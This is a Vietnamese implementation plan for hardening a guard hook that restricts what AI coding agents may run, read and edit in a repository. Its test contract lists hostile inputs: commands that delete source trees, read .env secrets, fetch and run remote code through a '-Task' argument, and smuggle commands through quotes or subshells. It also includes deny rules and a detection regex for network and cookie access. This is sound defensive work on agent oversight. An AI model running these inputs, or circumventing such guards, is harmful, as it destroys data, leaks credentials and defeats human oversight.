- [ ] Tạo `guard-paths.js`: chuyển `REPO_ROOT`, `WINDOWS_SEPARATOR`, `toPosix`, `toRepoRelative` từ `code-freeze-guard.js:32-115`. `REPO_ROOT` vẫn tính từ `import.meta.url` (`..`, `..`, `..` so với `.agents/scripts/guard-paths.js`).
- [ ] Thêm `isEnvSecretPath(p)`: basename hoặc bất kỳ segment nào khớp `/^\.env(?:$|[.\-_])/i`. Thêm `normalizeForCompare(p)`: `toPosix(p).toLowerCase()`.
- [ ] Tạo `plan-scope.js`: chuyển `hasApprovedPlanHeader`, `hasCompletedPlanHeader`, `hasApprovedPlanFooter`, `evaluatePlanApprovalContent`, `isSelfForgedPlanWrite`, `evaluateLatestDateGroupPlans` (`:172-297`). `code-freeze-guard.js` re-export các symbol này. `isPlanApproved` **vẫn định nghĩa** trong guard.
- [ ] Chạy toàn bộ test guard: kết quả phải giống Bước 0 (119 pass, 1 fail TC-08).

**Bước 2: P0-1 — Token whitelist**

- [ ] Viết `command-policy.js` theo §6.4: `tokenizeCommand`, `SAFE_TOKEN`, `COMMAND_RULES`, các validator `vitestArgs|gitArgs|runClaude|claudeProbe|verifyDocsArgs|safeTokens|onePath|none`, `evaluateCommand`.
- [ ] Trong `decide()`, thay khối `code-freeze-guard.js:691-730` bằng: `const verdict = evaluateCommand(input.command); return verdict.ok ? allow : ask(verdict.reason)`. Giữ các chuỗi reason mà test cũ đang assert: `"command chain contains a segment outside the read-only ALLOWLIST"` (`;`), `"redirection, chaining or a mutating flag"` (`:954`), `"outside the read-only ALLOWLIST"`.
- [ ] Viết `command-policy.test.ts` (TC-A, TC-B ở §8) **trước** khi hoàn thiện validator (TDD).

**Bước 3: P1-5 — Chặn `.env*`**

- [ ] `gitArgs`: reject token trỏ `.env*` (sau khi bỏ `<rev>:`), `--no-index`, glob chars.
- [ ] Áp `referencesEnvSecret` cho **mọi** rule (vd `npx vitest run .env.ts` cũng `ask`).
- [ ] Nhánh đọc của `decide()` (`:536-554`): thêm `Grep` vào tập tool đọc; kiểm `targetFile` (`path`) và `searchGlob` (trường `glob`, `extractInput` lấy thêm `args.glob`).
- [ ] `run-claude.ps1` `$sharedDisallowed`: thêm `Read(**/.env*)` (đã có), `Grep(.env*)`, `Bash(git *.env*)`, `Bash(git *.ENV*)`, `Bash(git *.Env*)`, `Bash(git * --no-index*)`.
- [ ] `.agents/hooks.json` matcher → `write_to_file|replace_file_content|multi_replace_file_content|write_file|edit_file|run_command|view_file|read_file`.

**Bước 4: P0-3 — Infra always-ask**

- [ ] Thêm hằng `PROTECTED_INFRA_FILES = ["scripts/code-freeze-guard.js", ".claude/settings.json", ".claude/settings.local.json", ".husky/install.mjs", "next.config.ts", "package-lock.json", ".npmrc", "AGENTS.md", "CLAUDE.md"]` và `PROTECTED_INFRA_PREFIXES = [".claude/", ".husky/"]`.
- [ ] `isProtectedInfraFile(relative)` so khớp trên `normalizeForCompare`. Gate 3c đặt sau 3b. Reason: `"⚠️ Infrastructure Guard: write targets protected harness/infra file."`.
- [ ] Chuyển các so sánh ở gate 2, 3b, 7 sang `normalizeForCompare`.
- [ ] `run-claude.ps1` `$sharedDisallowed`: thêm `Edit(.claude/**),Edit(.husky/**),Edit(CLAUDE.md),Edit(AGENTS.md),Edit(next.config.ts),Edit(package-lock.json),Edit(.npmrc),Edit(package.json)`.

**Bước 5: P1-7 — Scoped approval**

- [ ] Viết `extractDeclaredFiles`, `getActiveApprovedPlans`, `getApprovedPlanScope` trong `plan-scope.js` (§6.5).
- [ ] `decide()` gate 9: `resolvePlanScope(options)`. Nếu `!approved` → reason cũ `"write targets a frozen path"`. Nếu approved nhưng file không khai báo → `ask` với reason `"⚠️ Plan Scope Guard: <path> is not declared with [NEW]/[MODIFY]/[DELETE] in the active approved plan(s)."`.
- [ ] Cập nhật test Loại C (§8 TC-F).

**Bước 6: P2 — Hardening**

- [ ] `runHook(raw, deps)` + `installCrashHandlers()` + entrypoint mới (§6.1). Mọi lỗi ngoài `JSON.parse` → `stderr` reason, `exitCode 2`; stdout vẫn ghi `{decision:"ask"}` cho Antigravity.
- [ ] `FAST_TRACK_FORBIDDEN_CONTENT_TSX` (chỉ áp cho path `.tsx`, giữ regex cũ cho mọi path):
      `/\bfetch\b|\bXMLHttpRequest\b|\bWebSocket\b|\bEventSource\b|\bnavigator\.sendBeacon\b|\beval\b|\bFunction\s*\(|\bnew\s+Function\b|\b(?:localStorage|sessionStorage|indexedDB)\b|\bdocument\.cookie\b|\bcookieStore\b|\bwindow\.location\b|\blocation\.(?:href|assign|replace)\b|\bimport\s*\(|dangerouslySetInnerHTML|\b(?:window|globalThis|self)\s*\[/`.
- [ ] `run-claude.ps1`:
  - Sau `param(...)` thêm `$repoRoot = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot "..\.."))`.
  - `Normalize-PlanPath` dùng `$repoRoot` thay `(Get-Location).Path` (`:26`).
  - `Get-ChildItem -Path (Join-Path $repoRoot "docs/plans/*.md")` (`:101`).
  - Bọc phần từ bước 4 tới hết trong `Push-Location -LiteralPath $repoRoot` / `try { … } finally { Pop-Location }`, để `Test-Path -LiteralPath $relPlanFile`, `Copy-Item` và hook `node .agents/scripts/code-freeze-guard.js` (`:209`) resolve đúng khi gọi từ thư mục khác.
  - Matcher hook ở `:209` thêm `PowerShell|Grep`.
- [ ] `streaming-patterns/SKILL.md`:
  - `:41` → `src/app/api/chat-stream/route.ts`
  - `:42` → `src/app/api/chat-stream/chatStreamCore.ts`
  - `:43` `app/api/chat-stream/streaming.ts` (không tồn tại) → `src/app/api/chat-stream/streaming/utils.ts` (`sendEvent`, `[SRC]` `utils.ts:67-74`) + `src/app/api/chat-stream/streaming/*-stream.ts`
  - `:49-51` thêm tiền tố `src/`
  - `:114` `useChatStreamController.ts` — `processLine()` không tồn tại → `parseSSEEvent()` (`[SRC]` `useChatStreamController.ts:549`)
  - `:56`, `:114` sửa chữ `streaming.ts` → `streaming/utils.ts`
- [ ] `mental-simulation.md`:
  - `:52` `edit-image/route.ts:33` → `:36` (`[SRC]` `route.ts:36`)
  - `:54` `describe-image/route.ts:15` → `:18`
  - `:59` `src/lib/features/chat/batchGenQuota.ts` → `src/lib/core/batchGenQuota.ts` (`[SRC]` Glob)
- [ ] `.gitignore`: thêm `*.tmp.md`, `/temp.html`, `/.superpowers/`; đổi `:53` `.claude/skills` → `.claude/skills/*` + `!.claude/skills/vikini-*/`.
- [ ] Xóa root junk theo D2.

**Bước 7: P1-6 — Claude Code surface (sau khi Bước 2-5 xanh)**

- [ ] `CLAUDE.md` (< 20 dòng):

  ```markdown
  # Vikini — Claude Code Instructions

  Governance source of truth lives in `.agents/`. The files below are imported on every session.

  @AGENTS.md
  @.agents/rules/00-core.md
  @.agents/rules/05-plan-review.md

  Load `.agents/rules/02-quality.md` Pre-Work triggers before any code change.
  ```

- [ ] `.claude/settings.json`:
  ```json
  {
    "hooks": {
      "PreToolUse": [
        {
          "matcher": "Write|Edit|MultiEdit|NotebookEdit|Bash|PowerShell|Read|Grep",
          "hooks": [
            {
              "type": "command",
              "command": "node",
              "args": ["${CLAUDE_PROJECT_DIR}/.agents/scripts/code-freeze-guard.js"],
              "onFailure": "block",
              "timeout": 10
            }
          ]
        }
      ]
    },
    "permissions": {
      "deny": [
        "Read(.env*)",
        "Read(**/.env*)",
        "Bash(git add *)",
        "Bash(git commit *)",
        "Bash(git push *)",
        "Bash(git checkout *)",
        "Bash(git switch *)",
        "Bash(git reset *)",
        "Bash(git branch *)",
        "Bash(git stash *)",
        "Bash(git merge *)",
        "Bash(git rebase *)",
        "PowerShell(git add *)",
        "PowerShell(git commit *)",
        "PowerShell(git push *)",
        "PowerShell(git checkout *)",
        "PowerShell(git reset *)"
      ]
    }
  }
  ```
  (`extractInput` bổ sung đọc `args.notebook_path` để `NotebookEdit` có target.) Lưu ý: deny `git commit/push` ở project settings nghĩa là khi user yêu cầu commit, agent phải nhờ user tự chạy hoặc user override trong `settings.local.json`. Điều này phù hợp `00-core.md:61`.
- [ ] `.claude/settings.local.json`: xóa `:7` (`mkdir … deep-research`), `:9-10` (PowerShell vitest/eslint deep-research), `:11-14` (`git checkout/add/commit/push`), `:19-21` (`additionalDirectories` deep-research). Giữ `npm run *`, `npx eslint *`, `WebSearch`, `PowerShell(npm run type-check)`, các `WebFetch(domain:…)`.
- [ ] 4 stub `.claude/skills/vikini-{debug,audit,investigate,simplify}/SKILL.md`:

  ```markdown
  ---
  name: vikini-debug
  description: "<copy nguyên văn description từ .agents/skills/vikini-debug/SKILL.md>"
  ---

  Read and follow `.agents/skills/vikini-debug/SKILL.md` step-by-step. That file is the single source of truth; do not duplicate its content here.
  ```

**Bước 8: P0-4 — Ngân sách `always_on` (làm SAU Bước 4-5 vì 05 cần thêm chữ)**

- [ ] `02-quality.md`:
  - Chuyển bảng Pre-Work (`:12-31`) sang bullet list `- **<Domain>**: <files> → <skill>`. Ước tính tiết kiệm `~1,700` ký tự (A9).
  - Chuyển bảng Post-Change (`:49-53`) sang 3 bullet (`~250`).
  - Gộp mục "Phân Định Ranh Giới" (`:77-84`) còn 2 bullet và bỏ "Tham Chiếu Kỹ Thuật" đã có trong bảng Pre-Work (`~600`).
  - Giữ nguyên mọi chuỗi M5: `.agents/skills/vikini-debug/SKILL.md`, `.agents/skills/vikini-audit/SKILL.md`, `Skill Precedence Hierarchy`, `npm run type-check; npm run lint; npm run test:run`, `Loại A/B/C`, `12,000`, `10,000`, `ARCHITECTURAL ALERT: 3 fixes failed`; không thêm `.agents/workflows/`.
- [ ] `05-plan-review.md`:
  - §1 item 3: đổi "5 Danh Mục" thành "6 Danh Mục" (thêm (f) infra: `scripts/code-freeze-guard.js`, `.claude/**`, `.husky/**`, `next.config.ts`, `package-lock.json`, `.npmrc`, `AGENTS.md`, `CLAUDE.md`).
  - §1 item 2: "chỉ allow file khai báo `[NEW]/[MODIFY]/[DELETE]` trong plan Approved (Plan Scope Guard)".
  - §5: rút gọn mô tả thuật toán (`:52`) còn 1 câu + tham chiếu `plan-scope.js`.
  - Giữ chuỗi M5: `Scoped Protection`, `Fast-Track Mode`, `Zero-Self-Execution`, `10 vòng lặp`, `[BLOCKER]`, `[MAJOR]`, `[MINOR]`, `Status: Completed`, `Pre-Flight Gate`.
- [ ] `00-core.md:62`: bổ sung "(không pathspec `.env*`, không `--no-index`)". Chuyển "Token Efficiency" (`:51-56`) thành 2 bullet để bù ký tự.
- [ ] Đo: chạy TC-08, đọc breakdown (§8 TC-H thêm message breakdown). Yêu cầu tổng `<= 17,000`.

**Bước 9: Tài liệu sống & Post-Fix**

- [ ] `.agents/README.md:68-81` và `docs/architecture.md:262-264`: thêm danh mục infra, Plan Scope Guard, token whitelist, `.claude/settings.json`.
- [ ] `allowlist.md:24`: ghi chú "không pathspec/`rev:` trỏ `.env*`, không `--no-index`, không ký tự glob".
- [ ] `docs/CHANGELOG.md`: mục mới 2026-10-24.
- [ ] `docs/lessons-learned.md`:
  - Symptom: TC-08 vượt ngân sách.
  - Root Cause: Prettier pad lại bảng markdown + thêm nội dung không đo.
  - Fix: chuyển bảng sang bullet.
  - Prevention Rule: rules `always_on` không dùng bảng có cột rỗng.

  Thêm một lesson thứ hai: allowlist regex `\S+` cho phép PowerShell grouping `(...)`.

- [ ] Tier 2: `npm run type-check; npm run lint; npm run test:run`.
- [ ] Đổi Header plan → `- **Status**: Completed`.

### 8. Test Contract (Hợp Đồng Kiểm Thử Bắt Buộc)

Quy ước: `A(x)` = `decide({ command: x }).decision === "allow"`; `K(x)` = `=== "ask"`. Mọi assertion dùng `toBe`/`toEqual`/`toContain` cụ thể; cấm `toBeTruthy`/`toBeDefined` cho các assertion quyết định.

**TC-A — P0-1 Negative (mỗi lệnh `K` + reason khác rỗng)** — `command-policy.test.ts`

1. PowerShell grouping/subexpression/scriptblock/splat:
   - `git status (Remove-Item -Recurse src)`
   - `git log $(Remove-Item src)`
   - `git log @(rm src)`
   - `git show {rm src}`
   - `git diff $env:USERPROFILE`
   - `git log ${HOME}`
   - `git log @args`
2. Bash process substitution / subshell:
   - `git diff <(cat .env)`
   - `git diff >(tee x)`
   - `npx vitest run <(echo x)`
   - `git log $(cat x)`
   - `` git log `id` ``
3. Stop-parsing / comment / newline:
   - `git log --% x`
   - `git status #x`
   - `"git status\nrm -rf src"`
   - `"git status\r\nrm -rf src"`
   - `"git status\u0000"`
4. Smart quotes (A2):
   - `powershell -File .agents/scripts/run-claude.ps1 -Task 'a’; Remove-Item src; ‘b'`
   - `-Task "a”; rm src; “b"`
   - Một token chứa `\u201C`
5. run-claude `-Task/-Prompt` injection:
   - `-Task (iex(irm('https://x')))`
   - `-Task $env:ANTHROPIC_API_KEY`
   - `-Task "$(Remove-Item src)"`
   - `-Task "a$HOME"`
   - ``-Task "a`nb"``
   - `-Task "a\"b"`
   - `-Task @{a=1}`
   - `-Task 'it''s'` (cấm `''` để đơn giản hóa)
   - tham số lạ `-Unknown x`
   - `-File other.ps1`
   - `-PlanFile ../x.md`
   - `-ArtifactFile C:/Users/x/.gemini/antigravity/brain/../../x.md`
6. Chain:
   - `npm run lint; git status (rm src)`
   - `npm run lint;` + `rm -rf src` dạng `;rm`
   - `;`
   - `npm run lint && x`
   - `npm run lint | x`
   - `npm run lint & x`
7. Ký tự khác: `npm view @scope/pkg,(x)`, `git log ~/x`, `git log ^x` (ký tự `~ ^` ở đầu token).

**TC-B — P0-1 Positive (mỗi lệnh `A`)**

- **Toàn bộ** lệnh `allow` hiện có trong `code-freeze-guard.test.ts` (`:269-279`, `:285-291`, `:297-302`, `:308-313`, `:330-333`, `:921-946`, `:1440-1483`) phải giữ `A`. Không xóa/sửa input nào.
- Mới:
  - `powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -Role planner -PlanFile docs/plans/x.md -Task 'Lập kế hoạch: sửa (P0-1), giữ "quotes"; ok'`. Nháy đơn chứa `;`, `(`, `"` và Unicode tiếng Việt → `A`, và `;` trong nháy **không** bị tách segment.
  - `-Task "Revise plan (rev 2), keep scope"` → `A`.
  - `git blame -L 10,20 src/a.ts`, `git log --oneline -n 20 -- src/a.ts`, `git show HEAD~1:src/a.ts`, `npm view @types/node version` → `A`.
  - `npx vitest run "src/app/api/deep-research/[taskId]/route.test.ts"` → `A` (brackets chỉ được phép ngoài rule `gitArgs`).

**TC-C — P1-5 `.env` (mỗi lệnh `K`, reason chứa `".env"`)**

- `git diff -- .env`
- `git diff .env.local`
- `git show HEAD:.env.local`
- `git show :.env`
- `git show HEAD:./.env.production`
- `git show HEAD:src/../.env`
- `git log -p -- .ENV.local`
- `git blame .env`
- `git status .env`
- `git diff --no-index a b`
- `git log -- .en[v]`
- `git log -- .en?`
- `git log -- ":(glob)**/.env"`
- `git show HEAD:C:\Users\wyemh\vikini\.env.local`
- `npx vitest run .env.test.ts`

Positive: `git diff -- src/lib/env.ts`, `git show HEAD:docs/environment.md`, `git log -- src/lib/core/envConfig.ts` → `A`. Tức là chỉ chặn segment **bắt đầu** bằng `.env`.

Tool đọc (`decide({toolName, targetFile, searchGlob})`):

- `Grep` với `path` `.env.local` → `K`.
- `Grep` với `path` `src` + `glob` `.env*` → `K`.
- `Grep` với `path` `src` + `glob` `*.ts` → `allow`.
- `view_file`/`read_file`/`Read` giữ hành vi TC-05(d) (`:1354-1372`).

**TC-D — P0-3 Infra**

- Với mỗi path trong 9 file + `.claude/skills/vikini-debug/SKILL.md` + `.husky/pre-push`: `decide({ toolName: "Edit", targetFile: p }, { planApproved: true, approvedFiles: [p] })` → `ask`, reason chứa `"Infrastructure Guard"`.
- Biến thể hoa/thường: `claude.md`, `Agents.md`, `.Claude/Settings.json`, `NEXT.CONFIG.TS`, `.AGENTS/rules/00-core.md` → `ask`.
- `package.json` vẫn trả reason `"Test Infrastructure Guard"` (ưu tiên 3b, giữ test `:240-246`).

**TC-E — P0-3 không vô tình chặn đọc**: `Read` trên `CLAUDE.md`, `next.config.ts` → `allow`.

**TC-F — P1-7 Plan Scope** (`plan-scope.test.ts` + `code-freeze-guard.test.ts`)

1. `extractDeclaredFiles`, cho một nội dung gồm:
   - `[NEW]    src/a.ts`
   - `` - `[MODIFY]` `src/b.tsx` ``
   - ``| `[DELETE]` | `src/c.ts` |``
   - ``[MODIFY] [`src/d.ts`](file:///c:/x/src/d.ts)``
   - `` [NEW] `src/app/api/x/[id]/route.ts` ``
   - `[MODIFY] src/*.ts`
   - `[NEW] ../outside.ts`
   - `[NEW] src/dir/`
   - thẻ `[NEW] src/z.ts` nằm **sau** `## Audit History`

   Kết quả `toEqual(["src/a.ts","src/app/api/x/[id]/route.ts","src/b.tsx","src/c.ts","src/d.ts"])` (sorted). Glob, traversal, dir và Audit History đều bị loại.

2. `getActiveApprovedPlans`:
   - Nhóm ngày có 1 Approved + 1 Completed → trả 1 plan.
   - Có thêm 1 `Ready for Review` cùng ngày → `[]`.
   - Hai Approved cùng ngày → union files.
3. `decide` gate 9:
   - Declared → `allow`.
   - Undeclared `src/x.ts` → `ask`, reason chứa `"not declared"`.
   - Undeclared `public/logo.svg` → `ask` (D1).
   - `planApproved:false` → reason `"write targets a frozen path"`.
   - `planApproved:true` không `approvedFiles` → `ask` (fail-closed).
   - Declared nhưng là `src/lib/core/x.server.ts` → vẫn `ask` (Scoped Protection).
   - Declared `scripts/code-freeze-guard.js` → vẫn `ask` (Infra).
   - So khớp hoa/thường: declared `src/App.tsx`, target `src/app.tsx` → `allow` (NTFS).
4. **Loại C (spec change đã duyệt)**:
   - Test `:197-216` thêm `approvedFiles` khớp đúng path đang test (giữ `expect` count).
   - Test `:904-910` thêm `approvedFiles: ["src/app/features/chat/components/ChatBubble.tsx"]`.
   - Test `:1428-1436` matcher đổi sang chuỗi có `|view_file|read_file`.
   - **Không** giảm số `expect()`, không thêm `.skip/.only`.
5. `getApprovedPlanScope` khi `docs/plans` lỗi đọc (mock `fs.readdirSync` ném lỗi) → `{ approved:false, files:[] }`.

**TC-G — P2**

1. `runHook`:
   - `runHook("not json")` → `exitCode 0`, stdout JSON `decision:"ask"` (giữ hành vi cũ `:909-916`).
   - `runHook('{"hook_event_name":"PreToolUse","tool_input":{"command":"git status"}}')` → `exitCode 0`, `stdout ""`.
   - `runHook("{}", { decide: () => { throw new Error("boom") } })` → `exitCode 2`, `stderr` chứa `"failing closed"`.
2. spawnSync (Wiring): không thêm biến môi trường/flag test-only để ép crash; đường exit 2 được chứng minh qua `runHook` với `deps` inject (TC-G1). spawnSync `process.execPath` với `["--input-type=module", "-e", "await import('./.agents/scripts/code-freeze-guard.js')"]` (cwd = `REPO_ROOT`) → `status 0`, stdout rỗng (import không có side-effect vì `argv[1]` không khớp entrypoint). Wiring Probe 1 hiện có (`:1313-1352`) phải pass nguyên vẹn.
3. Fast-Track `.tsx`. Mỗi snippet ≤ 40 dòng → `ask` qua gate 9 (không còn Fast-Track):
   - `fetch("/api")`
   - `new WebSocket(u)`
   - `eval(s)`
   - `new Function("x")`
   - `localStorage.setItem`
   - `sessionStorage`
   - `document.cookie`
   - `window.location.href = u`
   - `await import("./x")`
   - `dangerouslySetInnerHTML={{__html:x}}`
   - `window["fe"+"tch"]`
   - `navigator.sendBeacon`

   Positive: `className="p-2"` đổi trên `.tsx` → Fast-Track `allow`; chuỗi `"Failed to fetch"` trong `src/lib/utils/translations/en.ts` → vẫn Fast-Track `allow` (regex `.tsx` không áp cho translations).

4. `run-claude.ps1` static assertions:
   - Chứa `$PSScriptRoot` trong biểu thức gán `$repoRoot`.
   - **Không** còn `(Get-Location).Path`.
   - Chứa `Push-Location -LiteralPath $repoRoot` và `Pop-Location`.
   - Chứa `Bash(git *.env*)` và `Bash(git * --no-index*)`.
   - Chứa `Edit(.claude/**)`.
   - Matcher `:209` chứa `PowerShell`.
   - Toàn bộ assertion TC-08 `:1585-1601` vẫn pass.
5. Stale paths:
   - Mọi path dạng `` `src/...` `` trong `streaming-patterns/SKILL.md` và `mental-simulation.md` phải `fs.existsSync` (bỏ hậu tố `:line`).
   - Với 3 trích dẫn `route.ts:N` ở `mental-simulation.md:51-54`, dòng N của file thật phải chứa `maxDuration`.

**TC-H — P0-4 (TC-08 mở rộng)**

- Giữ nguyên toàn bộ `expect` ở `:1496-1575`.
- Thêm message breakdown vào `expect(alwaysOnTotal, JSON.stringify(breakdown)).toBeLessThan(18000)` (chỉ thêm message, không đổi matcher/ngưỡng).
- Thêm assertion mới (tăng, không giảm):
  - `r05` chứa `"Plan Scope Guard"` và `"CLAUDE.md"`.
  - `r02` không chứa `"| :---"` (không còn bảng pad).

**TC-I — P1-6 wiring**

- `.claude/settings.json` parse được JSON và có:
  - `hooks.PreToolUse[0].matcher` chứa `Bash`, `PowerShell`, `Read`, `Grep`, `Edit`, `Write`.
  - `hooks[0].onFailure === "block"`.
  - `args[0]` kết thúc `/.agents/scripts/code-freeze-guard.js`.
  - `permissions.deny` chứa `Read(.env*)`.
- `.claude/settings.local.json` không chứa chuỗi `git add`, `git commit`, `git push`, `git checkout`, `deep-research`.
- `CLAUDE.md` có dòng đúng bằng `@.agents/rules/00-core.md` và `@.agents/rules/05-plan-review.md` (ngoài code span).
- Mỗi stub `.claude/skills/vikini-*/SKILL.md`: `description` **bằng đúng** description nguồn (chống drift) và body chứa đường dẫn `.agents/skills/<name>/SKILL.md`.
- `.gitignore` chứa `!.claude/skills/vikini-*/`, `/.superpowers/`, `*.tmp.md`.

**Tiêu chí pass/fail chống specification gaming**

- Mọi TC-A/TC-C phải kiểm cả `decision` **và** `reason` không rỗng.
- Cấm implement bằng cách hardcode chuỗi test (vd so khớp nguyên lệnh). Reviewer kiểm bằng biến thể không có trong test: `git status (ni x)`, `git blame HEAD:.EnV`.
- Số test guard sau thay đổi `>= 120 + số case mới`; `0 failed`.

### 9. Kế Hoạch Kiểm Thử Co-Located & Verification Plan

#### 9.1 Co-located tests

| Nguồn                                  | Test                                                                                                           |
| :------------------------------------- | :------------------------------------------------------------------------------------------------------------- |
| `.agents/scripts/guard-paths.js`       | `.agents/scripts/guard-paths.test.ts` (`toRepoRelative` chuyển sang, `isEnvSecretPath`, `normalizeForCompare`) |
| `.agents/scripts/command-policy.js`    | `.agents/scripts/command-policy.test.ts` (TC-A, TC-B, TC-C phần lệnh)                                          |
| `.agents/scripts/plan-scope.js`        | `.agents/scripts/plan-scope.test.ts` (TC-F 1, 2, 5)                                                            |
| `.agents/scripts/code-freeze-guard.js` | `.agents/scripts/code-freeze-guard.test.ts` (TC-C tool đọc, TC-D, TC-E, TC-F 3-4, TC-G, TC-H, TC-I)            |

#### 9.2 Lệnh kiểm chứng

```powershell
npx vitest run .agents/scripts --reporter=dot
npm run type-check; npm run lint; npm run test:run
```

#### 9.3 Wiring Probes

- **WP1 (hook thật, Claude payload):** test spawnSync gửi `{"hook_event_name":"PreToolUse","permission_mode":"dontAsk","tool_name":"Bash","tool_input":{"command":"git status (Remove-Item -Recurse src)"}}` → `status 0`, stdout JSON `permissionDecision: "deny"`.
- **WP2 (proxy root):** spawnSync `node scripts/code-freeze-guard.js` cùng payload → kết quả giống WP1. Chứng minh proxy (`scripts/code-freeze-guard.js:6`) vẫn chạy được sau khi tách module.
- **WP3 (Antigravity payload):** `{"toolCall":{"name":"view_file","args":{"Path":".env.local"}}}` → stdout `{"decision":"ask",...}`. Kèm test matcher hooks.json có `view_file`.
- **WP4 (Claude Code thật, thủ công, PM chạy 1 lần):** trong phiên `claude` tại repo, yêu cầu agent chạy `git show HEAD:.env.local` → phải thấy prompt/deny từ guard. Chạy `/hooks` thấy hook từ `.claude/settings.json`. Kết quả ghi vào CHANGELOG.
- **WP5 (run-claude từ thư mục khác):** `powershell -File C:\Users\wyemh\vikini\.agents\scripts\run-claude.ps1 -CheckOnly` từ `C:\` → `[CLAUDE_READY]`. Kèm static assertion TC-G4 cho phần `$repoRoot` (`-CheckOnly` thoát trước Normalize nên static test là control chính).

#### 9.4 Negative Probes (evidence-bar §4.5.3)

| Guard           | Input vi phạm                                                 | Kỳ vọng  | Vị trí test                                                                          |
| :-------------- | :------------------------------------------------------------ | :------- | :----------------------------------------------------------------------------------- |
| Token whitelist | `git status (Remove-Item -Recurse src)`                       | `ask`    | `command-policy.test.ts` TC-A1 + WP1                                                 |
| Token whitelist | `git diff <(cat .env)`                                        | `ask`    | TC-A2                                                                                |
| run-claude Task | `-Task (iex(irm('https://x')))`                               | `ask`    | TC-A5                                                                                |
| Smart quotes    | `-Task 'a’; Remove-Item src; ‘b'`                             | `ask`    | TC-A4                                                                                |
| `.env` qua git  | `git show HEAD:.env.local`                                    | `ask`    | TC-C                                                                                 |
| `.env` qua Grep | `Grep path=src glob=.env*`                                    | `ask`    | TC-C                                                                                 |
| Infra           | `Edit CLAUDE.md` (approved + declared)                        | `ask`    | TC-D                                                                                 |
| Plan scope      | `Edit src/x.ts` khi plan Approved nhưng không khai báo        | `ask`    | TC-F3                                                                                |
| Crash           | `decide` ném lỗi                                              | exit `2` | TC-G1                                                                                |
| Fast-Track      | `fetch()` trong `.tsx` ≤ 40 dòng                              | `ask`    | TC-G3                                                                                |
| Budget          | thêm 1,500 ký tự vào 02 (test-only fixture qua hàm tính tổng) | fail     | TC-H: tách `computeAlwaysOnBudget(files)` trong test để kiểm với fixture vượt ngưỡng |

### 10. Rủi Ro Tiềm Ẩn & Phương Án Phòng Ngừa

| #   | Rủi ro                                                                                                     | Mức        | Technical control (`[SRC]` / Negative Probe)                                                                                                                                                                                                                  |
| :-- | :--------------------------------------------------------------------------------------------------------- | :--------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| R1  | Whitelist quá chặt, chặn lệnh hợp lệ của Planner/Reviewer (vd `-Task` chứa ký tự lạ) làm gãy chuỗi tự động | Cao        | TC-B buộc toàn bộ lệnh `allow` hiện có (`code-freeze-guard.test.ts:269-333,921-946,1440-1483`) tiếp tục `allow`. Nháy đơn cho phép mọi ký tự trừ `'`, CR/LF và smart quotes. Fail mode là `ask` (không mất dữ liệu)                                           |
| R2  | Whitelist còn lỗ hổng chưa biết (shell khác: cmd.exe)                                                      | Cao        | Mô hình **default-deny theo token** (`command-policy.js` `SAFE_TOKEN` + `COMMAND_RULES`), không còn blacklist. Negative Probes TC-A1–A7 + biến thể reviewer (§8 chống gaming). `run-claude.ps1` vẫn giữ lớp `--disallowedTools` (`:170`) làm defense-in-depth |
| R3  | P1-7 làm vỡ flow thực thi plan cũ vì plan không khai báo đủ file                                           | Trung bình | Reason `Plan Scope Guard` nêu rõ path thiếu; fail mode `ask` (PM duyệt tay). TC-F1 bao các định dạng khai báo đang tồn tại (A11)                                                                                                                              |
| R4  | Plan tự khai báo file nhạy cảm để tự mở khóa                                                               | Cao        | Gate 9 nằm **sau** 3b/3c/4/5/6/7 (§6.2). Negative Probe TC-F3: declared `scripts/code-freeze-guard.js` / `*.server.ts` → `ask`                                                                                                                                |
| R5  | Bypass bằng khác biệt hoa/thường trên NTFS                                                                 | Trung bình | `normalizeForCompare` (`guard-paths.js`) ở gate 2, 3b, 3c, 7, 9. Negative Probe TC-D (`.Claude/Settings.json`, `.AGENTS/...`)                                                                                                                                 |
| R6  | `git log -p` không pathspec in `.env` từng commit                                                          | Thấp       | `.gitignore:5-8` loại `.env*.local`. Ghi nhận Out of Scope                                                                                                                                                                                                    |
| R7  | Hook `.claude/settings.json` crash/timeout làm treo mọi tool                                               | Trung bình | `runHook` + exit 2 có kiểm soát (TC-G1). `timeout: 10`. WP1/WP2 chứng minh đường đi bình thường exit 0                                                                                                                                                        |
| R8  | Hook crash trên Antigravity (không có `onFailure`) fail-open                                               | Cao        | P2 `installCrashHandlers` → exit 2 + stdout `ask` (TC-G1). Hiện trạng fail-open có dẫn chứng `code-freeze-guard.js:895-926` (A3)                                                                                                                              |
| R9  | Rút gọn rules làm rơi quy chuẩn bắt buộc                                                                   | Trung bình | 15 assertion M5 giữ nguyên (`code-freeze-guard.test.ts:1523-1575`) + TC-H assertion bổ sung. Prettier không làm phình lại vì đã bỏ bảng (A9)                                                                                                                  |
| R10 | Stub skill drift so với nguồn                                                                              | Thấp       | TC-I so khớp `description` nguyên văn                                                                                                                                                                                                                         |
| R11 | Xóa nhầm file untracked không khôi phục được (`.superpowers/`)                                             | Trung bình | D2: `git ls-files` trước khi xóa; untracked chỉ ignore trừ khi PM xác nhận. Control kiểm chứng: `.gitignore` assertion TC-I                                                                                                                                   |
| R12 | Tách module làm vỡ proxy `scripts/code-freeze-guard.js` hoặc import của test                               | Trung bình | Re-export đầy đủ từ `code-freeze-guard.js`. WP2 (spawnSync proxy) + 120 test cũ import từ `./code-freeze-guard.js` (`code-freeze-guard.test.ts:5-26`)                                                                                                         |
| R13 | `.claude/settings.json` deny `git commit/push` cản user khi user thực sự yêu cầu commit                    | Thấp       | Đúng `00-core.md:61`; user override cục bộ trong `settings.local.json`                                                                                                                                                                                        |

## Audit History

### Audit Run 1

[REVIEWER_MODEL: gemini-4-argon]

#### 1. Kiểm Chứng Lỗi Cũ (Audit Baseline P0 / P1 / P2)

Bảng đối chiếu các hạng mục phát hiện từ đợt audit harness trước mã nguồn thực tế và kế hoạch đề xuất:

| Mã       | Hạng mục                                                             | Trạng thái          | Dẫn chứng kiểm chứng (`[SRC]` / `[CMD]`) & Đánh giá                                                                                                                                                                                                                                                                                                     |
| :------- | :------------------------------------------------------------------- | :------------------ | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------- | ---------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
